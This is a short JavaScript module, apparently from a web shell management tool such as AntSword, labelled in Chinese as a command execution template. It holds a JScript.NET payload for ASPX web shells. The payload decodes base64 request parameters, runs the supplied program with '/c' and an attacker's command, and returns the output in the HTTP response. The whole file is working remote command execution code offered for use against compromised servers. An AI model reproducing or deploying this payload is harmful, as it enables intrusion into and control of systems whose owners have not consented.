/**
 * 命令执行模板
 */

module.exports = (arg1, arg2) => ({
  exec: {
    _:
      `var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"]));e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd()+EI.ReadToEnd());`,
    [arg1]: "#{base64::bin}",
    [arg2]: "#{base64::cmd}"
  }
})
